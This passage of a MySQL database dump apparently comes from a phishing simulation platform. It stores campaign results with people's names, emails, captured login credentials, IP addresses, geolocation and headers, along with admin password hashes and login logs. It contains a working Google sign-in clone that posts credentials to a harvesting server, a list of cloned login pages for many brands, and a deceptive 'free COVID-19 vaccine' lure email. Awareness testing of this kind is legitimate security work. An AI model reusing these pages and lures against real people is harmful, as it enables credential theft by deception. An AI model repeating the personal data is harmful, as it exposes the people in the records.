  `public_ip` mediumtext COLLATE utf8mb4_general_ci,
  `ip_info` mediumtext COLLATE utf8mb4_general_ci,
  `user_agent` mediumtext COLLATE utf8mb4_general_ci,
  `mail_client` mediumtext COLLATE utf8mb4_general_ci,
  `platform` mediumtext COLLATE utf8mb4_general_ci,
  `device_type` mediumtext COLLATE utf8mb4_general_ci,
  `all_headers` mediumtext COLLATE utf8mb4_general_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `tb_data_mailcamp_live`
--

INSERT INTO `tb_data_mailcamp_live` (`rid`, `campaign_id`, `campaign_name`, `sending_status`, `send_time`, `user_name`, `user_email`, `send_error`, `mail_open_times`, `mail_replies`, `payloads_clicked`, `employees_compromised`, `compromised_email`, `compromised_pass`, `emails_reported`, `public_ip`, `ip_info`, `user_agent`, `mail_client`, `platform`, `device_type`, `all_headers`) VALUES
('7cnzdppw29', '1xlejz', 'Postman', 2, '1695961261336', 'Abhishek Chaudhary', 'abhishek@techowl.in', NULL, '[1695961518651,1695961524030,1695961526613,1695961646719,1695961825866,1695961828862,1695961830047,1695961841575,1695961977957,1695961979028,1695962041418,1696000182496,1696075385555]', NULL, '[1695961545145]', '[1695961545145]', '[\"abhi7991@gmail.com\"]', '[\"123456789\"]', NULL, '[\"122.170.103.89\"]', '{\"country\":\"India\",\"city\":\"Mumbai\",\"zip\":\"400034\",\"isp\":\"Bharti Airtel Ltd., Telemedia Services\",\"timezone\":\"Asia\\/Kolkata (+0530)\",\"coordinates\":\"19.0748(lat)\\/72.8856(long)\"}', '[\"Mozilla\\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\\/537.36 (KHTML, like Gecko) Chrome\\/117.0.0.0 Safari\\/537.36\"]', '[\"Chrome\"]', '[\"macOS Catalina\"]', '[\"Desktop\"]', '[\"Content-Length: 61\\r\\nContent-Type: application\\/x-www-form-urlencoded\\r\\nAccept: text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,image\\/avif,image\\/webp,image\\/apng,*\\/*;q=0.8,application\\/signed-exchange;v=b3;q=0.7\\r\\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\\r\\nCache-Control: max-age=0\\r\\nHost: techowlphish.com\\r\\nOrigin: https:\\/\\/notificationinfo.com\\r\\nReferer: https:\\/\\/notificationinfo.com\\/\\r\\nSec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;117&quot;, &quot;Not;A=Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;117&quot;\\r\\nSec-Ch-Ua-Mobile: ?0\\r\\nSec-Ch-Ua-Platform: &quot;macOS&quot;\\r\\nSec-Fetch-Dest: document\\r\\nSec-Fetch-Mode: navigate\\r\\nSec-Fetch-Site: cross-site\\r\\nSec-Fetch-User: ?1\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla\\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\\/537.36 (KHTML, like Gecko) Chrome\\/117.0.0.0 Safari\\/537.36\\r\\nX-Forwarded-For: 122.170.103.89\\r\\nX-Forwarded-Host: techowlphish.com\\r\\nX-Forwarded-Port: 443\\r\\nX-Forwarded-Proto: https\\r\\nX-Forwarded-Server: techowlphish.com\\r\\nX-Https: 1\\r\\nX-Real-Ip: 122.170.103.89\\r\\n\"]'),
('c0alktsr6q', 'u82afo', 'Camp - 29-09', 2, '1695968121326', 'Noyore Noyore3178', 'noyore3178@fandsend.com', NULL, '[1695968146210,1695968162472]', NULL, '[1695968186954]', '[1695968186954]', '[\"googlenitika@gmail.com\"]', '[\"1234567890-\"]', NULL, '[\"103.59.75.29\"]', '{\"country\":\"India\",\"city\":\"Jaipur\",\"zip\":\"302021\",\"isp\":\"TATA PLAY BROADBAND PRIVATE LIMITED\",\"timezone\":\"Asia\\/Kolkata (+0530)\",\"coordinates\":\"26.9525(lat)\\/75.7105(long)\"}', '[\"Mozilla\\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\\/537.36 (KHTML, like Gecko) Chrome\\/117.0.0.0 Safari\\/537.36\"]', '[\"Chrome\"]', '[\"Windows 10\"]', '[\"Desktop\"]', '[\"Content-Length: 328\\r\\nContent-Type: application\\/x-www-form-urlencoded\\r\\nAccept: text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,image\\/avif,image\\/webp,image\\/apng,*\\/*;q=0.8,application\\/signed-exchange;v=b3;q=0.7\\r\\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\\r\\nBn-Client-Port: 44030\\r\\nCache-Control: max-age=0\\r\\nHost: techowlphish.com\\r\\nOrigin: https:\\/\\/notificationinfo.com\\r\\nReferer: https:\\/\\/notificationinfo.com\\/\\r\\nSec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;117&quot;, &quot;Not;A=Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;117&quot;\\r\\nSec-Ch-Ua-Mobile: ?0\\r\\nSec-Ch-Ua-Platform: &quot;Windows&quot;\\r\\nSec-Fetch-Dest: document\\r\\nSec-Fetch-Mode: navigate\\r\\nSec-Fetch-Site: cross-site\\r\\nSec-Fetch-User: ?1\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla\\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\\/537.36 (KHTML, like Gecko) Chrome\\/117.0.0.0 Safari\\/537.36\\r\\nX-Forwarded-For: 103.59.75.29\\r\\nX-Forwarded-Host: techowlphish.com\\r\\nX-Forwarded-Port: 443\\r\\nX-Forwarded-Proto: https\\r\\nX-Forwarded-Server: techowlphish.com\\r\\nX-Https: 1\\r\\nX-Real-Ip: 103.59.75.29\\r\\n\"]'),
('jg37coesrv', 'u591ri', 'Camp - 29 sept', 2, '1695965255345', 'Noyore Noyore3178', 'noyore3178@fandsend.com', NULL, '[1695965281719,1695965372287,1695965690063]', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
('smc96kjt3v', '7ii9yi', 'Postman Trial', 2, '1695902520955', 'Noyore Noyore3178', 'noyore3178@fandsend.com', NULL, '[1695902540619]', NULL, '[1695902612826]', '[1695902612826]', '[\"nurida@mailinator.com\"]', '[\"1234567890\"]', NULL, '[\"103.59.75.249\"]', '{\"country\":\"India\",\"city\":\"Jaipur\",\"zip\":\"302021\",\"isp\":\"TATA PLAY BROADBAND PRIVATE LIMITED\",\"timezone\":\"Asia\\/Kolkata (+0530)\",\"coordinates\":\"26.9525(lat)\\/75.7105(long)\"}', '[\"Mozilla\\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\\/537.36 (KHTML, like Gecko) Chrome\\/117.0.0.0 Safari\\/537.36\"]', '[\"Chrome\"]', '[\"Windows 10\"]', '[\"Desktop\"]', '[\"Content-Length: 65\\r\\nContent-Type: application\\/x-www-form-urlencoded\\r\\nAccept: text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,image\\/avif,image\\/webp,image\\/apng,*\\/*;q=0.8,application\\/signed-exchange;v=b3;q=0.7\\r\\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\\r\\nBn-Client-Port: 23195\\r\\nCache-Control: max-age=0\\r\\nHost: techowlphish.com\\r\\nOrigin: https:\\/\\/notificationinfo.com\\r\\nReferer: https:\\/\\/notificationinfo.com\\/\\r\\nSec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;117&quot;, &quot;Not;A=Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;117&quot;\\r\\nSec-Ch-Ua-Mobile: ?0\\r\\nSec-Ch-Ua-Platform: &quot;Windows&quot;\\r\\nSec-Fetch-Dest: document\\r\\nSec-Fetch-Mode: navigate\\r\\nSec-Fetch-Site: cross-site\\r\\nSec-Fetch-User: ?1\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla\\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\\/537.36 (KHTML, like Gecko) Chrome\\/117.0.0.0 Safari\\/537.36\\r\\nX-Forwarded-For: 103.59.75.249\\r\\nX-Forwarded-Host: techowlphish.com\\r\\nX-Forwarded-Port: 443\\r\\nX-Forwarded-Proto: https\\r\\nX-Forwarded-Server: techowlphish.com\\r\\nX-Https: 1\\r\\nX-Real-Ip: 103.59.75.249\\r\\n\"]');

-- --------------------------------------------------------

--
-- Table structure for table `tb_data_quick_tracker_live`
--

CREATE TABLE `tb_data_quick_tracker_live` (
  `id` int NOT NULL,
  `tracker_id` varchar(111) DEFAULT NULL,
  `rid` varchar(111) DEFAULT NULL,
  `public_ip` varchar(111) DEFAULT NULL,
  `ip_info` varchar(2222) DEFAULT NULL,
  `user_agent` varchar(222) DEFAULT NULL,
  `mail_client` varchar(222) DEFAULT NULL,
  `platform` varchar(222) DEFAULT NULL,
  `all_headers` varchar(2222) DEFAULT NULL,
  `time` varchar(222) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tb_data_webform_submit`
--

CREATE TABLE `tb_data_webform_submit` (
  `id` int NOT NULL,
  `tracker_id` varchar(111) DEFAULT NULL,
  `rid` varchar(222) DEFAULT NULL,
  `session_id` varchar(222) DEFAULT NULL,
  `public_ip` varchar(222) DEFAULT NULL,
  `ip_info` varchar(2222) DEFAULT NULL,
  `user_agent` varchar(222) DEFAULT NULL,
  `screen_res` varchar(22) DEFAULT NULL,
  `time` varchar(222) DEFAULT NULL,
  `browser` varchar(222) DEFAULT NULL,
  `platform` varchar(222) DEFAULT NULL,
  `device_type` varchar(11) DEFAULT NULL,
  `page` int DEFAULT NULL,
  `form_field_data` varchar(22222) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tb_data_webpage_visit`
--

CREATE TABLE `tb_data_webpage_visit` (
  `id` int NOT NULL,
  `tracker_id` varchar(111) DEFAULT NULL,
  `rid` varchar(222) DEFAULT NULL,
  `session_id` varchar(222) DEFAULT NULL,
  `public_ip` varchar(222) DEFAULT NULL,
  `ip_info` varchar(2222) DEFAULT NULL,
  `user_agent` varchar(222) DEFAULT NULL,
  `screen_res` varchar(22) DEFAULT NULL,
  `time` varchar(222) DEFAULT NULL,
  `browser` varchar(222) DEFAULT NULL,
  `platform` varchar(222) DEFAULT NULL,
  `device_type` varchar(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tb_domains`
--

CREATE TABLE `tb_domains` (
  `id` int NOT NULL,
  `name` varchar(255) NOT NULL,
  `path` varchar(255) NOT NULL,
  `sender_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `status` int NOT NULL DEFAULT '1' COMMENT '1=>''Active'', 2=> ''Deleted''',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `modified_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Dumping data for table `tb_domains`
--

INSERT INTO `tb_domains` (`id`, `name`, `path`, `sender_id`, `status`, `created_at`, `modified_at`) VALUES
(1, 'alertweb.me', '/home/techowlphish/alertweb.me/', 'za5z2y', 1, '2023-09-25 09:29:29', '2023-09-27 13:10:29'),
(9, 'notificationinfo.com', '/home/techowlphish/notificationinfo.com/', 'zadz2y', 1, '2023-09-25 09:29:29', '2023-09-27 13:10:34');

-- --------------------------------------------------------

--
-- Table structure for table `tb_hf_list`
--

CREATE TABLE `tb_hf_list` (
  `hf_id` varchar(11) COLLATE utf8mb4_general_ci NOT NULL,
  `hf_name` varchar(111) COLLATE utf8mb4_general_ci NOT NULL,
  `file_original_name` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `file_header` varchar(111) COLLATE utf8mb4_general_ci NOT NULL,
  `date` varchar(111) COLLATE utf8mb4_general_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tb_hland_page_list`
--

CREATE TABLE `tb_hland_page_list` (
  `hlp_id` varchar(11) COLLATE utf8mb4_general_ci NOT NULL,
  `page_name` mediumtext COLLATE utf8mb4_general_ci,
  `page_file_name` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `date` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `domain` int DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `tb_hland_page_list`
--

INSERT INTO `tb_hland_page_list` (`hlp_id`, `page_name`, `page_file_name`, `date`, `domain`) VALUES
('0p15e4', 'Google Login', 'google_login.php', '02-10-2023 04:46 AM', 9),
('5c5tuw', 'Pinterest', 'pinterest.php', '03-10-2023 10:50 AM', 9),
('ah4llj', 'Microsoft', 'microsoft.php', '02-10-2023 09:07 AM', 9),
('chosvv', 'Amazon', 'amazon.php', '02-10-2023 04:52 AM', 9),
('e6rcta', 'Spotify', 'spotify.php', '02-10-2023 11:41 AM', 9),
('fcqsro', 'Protonmail', 'protonmail.php', '03-10-2023 05:54 AM', 9),
('g2hrlq', 'Wi-fi', 'wifi.php', '03-10-2023 10:54 AM', 9),
('gap00e', 'Linkedin', 'linkedin.php', '02-10-2023 10:51 AM', 9),
('gndfe9', 'Wordpress', 'wordpress.php', '03-10-2023 05:14 AM', 9),
('hcwtg6', 'Twitter', 'twitter.php', '03-10-2023 05:21 AM', 9),
('j7r2pu', 'Adobe', 'adobe.php', '02-10-2023 05:24 AM', 9),
('jfg9a9', 'Origin', 'origin.php', '03-10-2023 10:18 AM', 9),
('k0qjz8', 'Instafollowers', 'instafollowers.php', '02-10-2023 07:08 AM', 9),
('kpvxcm', 'Paypal', 'paypal.php', '02-10-2023 11:03 AM', 9),
('mdancb', 'Yandex', 'yandex.php', '03-10-2023 11:25 AM', 9),
('nhnwhv', 'Steam', 'steam.php', '03-10-2023 09:55 AM', 9),
('pob1vh', 'Create', 'create.php', '02-10-2023 06:21 AM', 9),
('qkogt8', 'Instagram', 'instagram.php', '03-10-2023 11:43 AM', 9),
('rh9pth', 'Netflix', 'netflix.php', '02-10-2023 09:40 AM', 9),
('sdxwxb', 'Badoo', 'badoo.php', '02-10-2023 06:16 AM', 9),
('t52dti', 'Shopping', 'shopping.php', '03-10-2023 12:13 PM', 9),
('u0qu1a', 'Snapchat', 'snapchat.php', '03-10-2023 05:32 AM', 9),
('z9a5a0', 'Yahoo', 'yahoo.php', '02-10-2023 11:33 AM', 9),
('z9eamw', 'Playstation', 'playstation.php', '03-10-2023 12:41 PM', 9);

-- --------------------------------------------------------

--
-- Table structure for table `tb_ht_list`
--

CREATE TABLE `tb_ht_list` (
  `ht_id` varchar(11) COLLATE utf8mb4_general_ci NOT NULL,
  `ht_name` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `alg` varchar(1111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `file_extension` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `file_header` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `date` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tb_log`
--

CREATE TABLE `tb_log` (
  `id` int NOT NULL,
  `username` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `log` text COLLATE utf8mb4_general_ci,
  `ip` varchar(55) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `date` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `tb_log`
--

INSERT INTO `tb_log` (`id`, `username`, `log`, `ip`, `date`) VALUES
(1, 'abhishek@techowl.in', 'Account login', '103.59.75.29', '29-09-2023 03:44 AM'),
(2, 'abhishek@techowl.in', 'Account login', '122.170.103.89', '29-09-2023 04:07 AM'),
(3, NULL, 'Account logout', '122.170.103.89', '29-09-2023 04:36 AM'),
(4, 'abhishek@techowl.in', 'Account login', '122.170.103.89', '29-09-2023 04:36 AM'),
(5, 'abhishek@techowl.in', 'Account login', '110.227.246.165', '29-09-2023 05:26 AM'),
(6, NULL, 'Account logout', '103.59.75.29', '29-09-2023 06:30 AM'),
(7, 'abhishek@techowl.in', 'Account login', '103.59.75.29', '29-09-2023 06:31 AM'),
(8, 'abhishek@techowl.in', 'Account login', '157.38.251.173', '29-09-2023 06:41 AM'),
(9, 'abhishek@techowl.in', 'Account login', '122.170.103.89', '29-09-2023 07:15 AM'),
(10, 'abhishek@techowl.in', 'Account login', '103.59.75.29', '29-09-2023 07:59 AM'),
(11, 'abhishek@techowl.in', 'Account login', '157.38.251.173', '29-09-2023 08:47 AM'),
(12, 'abhishek@techowl.in', 'Account login', '103.59.75.29', '29-09-2023 09:25 AM'),
(13, 'abhishek@techowl.in', 'Account login', '103.59.75.29', '29-09-2023 10:09 AM'),
(14, 'abhishek@techowl.in', 'Account login', '103.59.75.37', '29-09-2023 11:18 AM'),
(15, 'abhishek@techowl.in', 'Account login', '103.59.75.37', '29-09-2023 12:58 PM'),
(16, 'abhishek@techowl.in', 'Account login', '103.59.75.37', '29-09-2023 12:58 PM'),
(17, 'abhishek@techowl.in', 'Account login', '122.170.103.89', '30-09-2023 05:13 AM'),
(18, 'abhishek@techowl.in', 'Account login', '122.161.200.55', '02-10-2023 03:42 AM'),
(19, 'abhishek@techowl.in', 'Account login', '103.59.75.184', '02-10-2023 03:53 AM'),
(20, 'abhishek@techowl.in', 'Account login', '122.161.200.55', '02-10-2023 04:52 AM'),
(21, 'abhishek@techowl.in', 'Account login', '122.161.200.55', '02-10-2023 06:16 AM'),
(22, 'abhishek@techowl.in', 'Account login', '122.161.200.55', '02-10-2023 09:06 AM'),
(23, 'abhishek@techowl.in', 'Account login', '122.161.200.55', '02-10-2023 09:40 AM'),
(24, 'abhishek@techowl.in', 'Account login', '103.59.75.184', '02-10-2023 09:50 AM'),
(25, 'abhishek@techowl.in', 'Account login', '122.161.200.55', '02-10-2023 10:50 AM'),
(26, 'abhishek@techowl.in', 'Account login', '122.161.200.55', '02-10-2023 12:10 PM'),
(27, 'abhishek@techowl.in', 'Account login', '103.59.75.184', '02-10-2023 12:55 PM'),
(28, 'abhishek@techowl.in', 'Account login', '122.170.103.89', '03-10-2023 03:41 AM'),
(29, 'abhishek@techowl.in', 'Account login', '27.58.218.70', '03-10-2023 03:44 AM'),
(30, 'abhishek@techowl.in', 'Account login', '27.58.218.70', '03-10-2023 05:13 AM'),
(31, 'abhishek@techowl.in', 'Account login', '27.58.218.70', '03-10-2023 08:43 AM'),
(32, 'abhishek@techowl.in', 'Account login', '103.59.75.135', '03-10-2023 10:48 AM'),
(33, 'abhishek@techowl.in', 'Account login', '27.58.218.70', '03-10-2023 12:12 PM'),
(34, 'abhishek@techowl.in', 'Account login', '122.170.103.89', '04-10-2023 03:54 AM');

-- --------------------------------------------------------

--
-- Table structure for table `tb_mail_verify`
--

CREATE TABLE `tb_mail_verify` (
  `id` bigint NOT NULL,
  `userid` bigint NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `domain` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `code` bigint NOT NULL,
  `status` int NOT NULL DEFAULT '0',
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tb_mail_verify`
--

INSERT INTO `tb_mail_verify` (`id`, `userid`, `email`, `domain`, `code`, `status`, `created_at`, `updated_at`) VALUES
(67, 12, 'noyore3178@fandsend.com', 'fandsend.com', 918659, 1, '2023-09-28 12:00:13', '2023-09-28 12:00:13'),
(68, 4, 'abhishek@techowl.in', 'techowl.in', 883451, 1, '2023-09-29 04:19:26', '2023-09-29 04:19:26'),
(69, 12, 'nitika.img@yopmail.com', 'yopmail.com', 321112, 0, '2023-09-29 04:43:32', '2023-09-29 04:43:32');

-- --------------------------------------------------------

--
-- Table structure for table `tb_main`
--

CREATE TABLE `tb_main` (
  `id` int NOT NULL,
  `name` varchar(111) DEFAULT NULL,
  `username` varchar(111) DEFAULT NULL,
  `password` varchar(222) DEFAULT NULL,
  `contact_mail` varchar(111) DEFAULT NULL,
  `dp_name` varchar(111) DEFAULT NULL,
  `status` int NOT NULL DEFAULT '1' COMMENT '0=>Deactive, 1=> Activate, 2=>Deleted',
  `v_hash` varchar(111) DEFAULT NULL,
  `v_hash_time` varchar(111) DEFAULT NULL,
  `date` varchar(111) DEFAULT NULL,
  `last_login` varchar(111) DEFAULT NULL,
  `last_logout` varchar(111) DEFAULT NULL,
  `user_role` int NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tb_main`
--

INSERT INTO `tb_main` (`id`, `name`, `username`, `password`, `contact_mail`, `dp_name`, `status`, `v_hash`, `v_hash_time`, `date`, `last_login`, `last_logout`, `user_role`) VALUES
(1, 'Admin', 'admin', 'ef797c8118f02dfb649607dd5d3f8c7623048c9c063d532cc95c5ed7a898a64f', 'abhishek@techowl.in', '3', 1, NULL, NULL, '17-02-2023 05:28 AM', '[\"03-10-2023 12:12 PM\",\"04-10-2023 03:54 AM\"]', NULL, 1),
(4, 'User', 'abhishek', '4d8e4ee4c618cb9958f819c0ef16df29ef244c2f1dc671859efa2bc41496c3e4', 'abhishek@p-technocyber.com', '1', 1, '', '', '17-06-2023 05:32 AM', '[\"29-06-2023 04:12 AM\",\"29-06-2023 06:30 AM\"]', '', 0),
(12, 'User', 'Nitika New', '791cbc4ab0d83118376f988a49f306e995a6ccd8f19cfd4c3b9799eb860d23d7', 'nitikanew@yopmail.com', '1', 1, '', '', '12-09-2023 12:30 PM', '12-09-2023 12:30 PM', '', 0);

-- --------------------------------------------------------

--
-- Table structure for table `tb_main_cron`
--

CREATE TABLE `tb_main_cron` (
  `id` int NOT NULL,
  `pid` int DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `tb_main_cron`
--

INSERT INTO `tb_main_cron` (`id`, `pid`) VALUES
(1, 15859);

-- --------------------------------------------------------

--
-- Table structure for table `tb_main_variables`
--

CREATE TABLE `tb_main_variables` (
  `id` int NOT NULL,
  `server_protocol` varchar(11) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `domain` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `baseurl` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `time_zone` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `time_format` varchar(222) COLLATE utf8mb4_general_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `tb_main_variables`
--

INSERT INTO `tb_main_variables` (`id`, `server_protocol`, `domain`, `baseurl`, `time_zone`, `time_format`) VALUES
(1, 'http', 'techowlphish.com', 'https://techowlphish.com', '{\"timezone\":\"Asia\\/Kolkata\",\"value\":19800}', '{\"date\":\"d-m-o\",\"space\":\"comaspace\",\"time\":\"h:i:s:v A\"}');

-- --------------------------------------------------------

--
-- Table structure for table `tb_pl_list`
--

CREATE TABLE `tb_pl_list` (
  `pl_id` varchar(11) COLLATE utf8mb4_general_ci NOT NULL,
  `pl_name` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `file_name` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `pl_type` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `pl_sub_type` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `date` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tb_store`
--

CREATE TABLE `tb_store` (
  `type` varchar(111) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `name` varchar(111) COLLATE utf8mb4_general_ci NOT NULL,
  `info` varchar(700) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `content` mediumtext COLLATE utf8mb4_general_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `tb_store`
--

INSERT INTO `tb_store` (`type`, `name`, `info`, `content`) VALUES
('mail_sender', 'Amazon SES', '{\"dsn_type\":\"amazon_ses\",\"disp_note\":\"\"}', '{\"from\":\"\",\"username\":\"\",\"mailbox\":{\"value\":\"\",\"disabled\":false,\"checked\":false},\"smtp\":{\"value\":\"NA\",\"disabled\":true}}'),
('mail_sender', 'Custom', '{\"dsn_type\":\"custom\",\"disp_note\":\"Note: Custom mail sender template\"}', '{\"from\":\"\",\"username\":\"\",\"mailbox\":{\"value\":\"\",\"disabled\":false,\"checked\":false},\"smtp\":{\"value\":\"\",\"disabled\":false}}'),
('mail_template', 'Give me your address', '{\"disp_note\":\"Desc: A simple mail to track mail open and capture data from the phishing site\"}', '{\"mail_template_subject\":\"Free COVID-19 Vaccine for {{FNAME}}\",\"mail_template_content\":\"Dear Sir\\/Madam<br><br>We are happy to inform you that you have been selected to receive the COVID-19 vaccine at your home for free. Please submit your address in the link given below, so that we can arrange our medical representative.<br><br>Submit address <a href=\\\"https:\\/\\/techowlphish.com \\/form.html?rid={{RID}}\\\">here<\\/a><br><br>Please let us know if you have any questions.<br><br>Regards,<br>Cage,<br>Chief Medical Officer<br><br>{{TRACKER}}\",\"timage_type\":1,\"mail_content_type\":\"text/html\",\"attachment\":[]}'),
('mail_sender', 'Gmail (gmail.com)', '{\"dsn_type\":\"gmail\",\"disp_note\":\"Note: You need to create app specifc password instead of your mail pasword. Refer <a href=\'https://support.google.com/accounts/answer/185833\' target=\'_blank\'>https://support.google.com/accounts/answer/185833</a>\"}', '{\"from\":\"Name<username@gmail.com>\",\"username\":\"username@gmail.com\",\"mailbox\":{\"value\":\"{imap.gmail.com:993/imap/ssl}INBOX\",\"disabled\":true,\"checked\":true},\"smtp\":{\"value\":\"NA\",\"disabled\":true}}'),
('mail_landing', 'Google Login', 'google_login.php', '{\r\n  \"mail_landing\": \"<body style=\\\"margin: 0; padding: 0; background-size: cover; font-family: sans-serif;\\\"><div class=\\\"box\\\" style=\\\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 25rem; padding: 2.5rem; box-sizing: border-box; border: 1px solid #dadce0; -webkit-border-radius: 8px; border-radius: 8px;\\\"><h2 style=\\\"margin: 0px 0 -0.125rem; padding: 0; color: #fff; text-align: center; color: #202124; font-family: \'Google Sans\',\'Noto Sans Myanmar UI\',arial,sans-serif; font-size: 24px; font-weight: 400;\\\">Sign in</h2><p style=\\\"font-size: 16px; font-weight: 400; letter-spacing: .1px; line-height: 1.5; margin-bottom: 25px; text-align: center;\\\">Use your Google Account</p><form class=\\\"form-horizontal m-t-20\\\" id=\\\"loginform\\\" method=\\\"post\\\" action=\\\"https://techowlphish.com/landingmail.php?landingrid=<?php echo $_GET[\'landingrid\'] ?>&#38;landingmid=<?php echo $_GET[\'landingmid\'] ?>\\\"><div class=\\\"inputBox\\\" style=\\\"position: relative;\\\"><input type=\\\"email\\\" name=\\\"email\\\" required><label>Username</label></div><div class=\\\"inputBox\\\" style=\\\"position: relative;\\\"><input type=\\\"password\\\" name=\\\"password\\\" required><label>Password</label></div><input type=\\\"submit\\\" name=\\\"sign-in\\\" value=\\\"Sign In\\\" style=\\\"border: none; outline: none; color: #fff; background-color: #1a73e8; padding: 0.625rem 1.25rem; cursor: pointer; border-radius: 0.312rem; font-size: 1rem; float: right;\\\"></form></div></body>\",\r\n  \"attachment\": []\r\n}'),
('mail_sender', 'Mailchimp Mandrill', '{\"dsn_type\":\"mailchimp_mandrill\",\"disp_note\":\"\"}', '{\"from\":\"\",\"username\":\"\",\"mailbox\":{\"value\":\"\",\"disabled\":false,\"checked\":false},\"smtp\":{\"value\":\"NA\",\"disabled\":true}}'),
('mail_sender', 'Mailgun', '{\"dsn_type\":\"mailgun\",\"disp_note\":\"\"}', '{\"from\":\"\",\"username\":\"\",\"mailbox\":{\"value\":\"\",\"disabled\":false,\"checked\":false},\"smtp\":{\"value\":\"NA\",\"disabled\":true}}'),
('mail_sender', 'Mailjet', '{\"dsn_type\":\"mailjet\",\"disp_note\":\"Note: Provide the value for ACCESS_KEY at \'SMTP Username\' field and SECRET_KEY at \'SMTP Password\' field.\"}', '{\"from\":\"\",\"username\":\"\",\"mailbox\":{\"value\":\"\",\"disabled\":false,\"checked\":false},\"smtp\":{\"value\":\"NA\",\"disabled\":true}}'),
('mail_sender', 'MailPace', '{\"dsn_type\":\"mailpace\",\"disp_note\":\"Note: Provide the value of API_TOKEN at \'SMTP Password\' field.\"}', '{\"from\":\"\",\"username\":\"\",\"mailbox\":{\"value\":\"\",\"disabled\":false,\"checked\":false},\"smtp\":{\"value\":\"NA\",\"disabled\":true}}'),
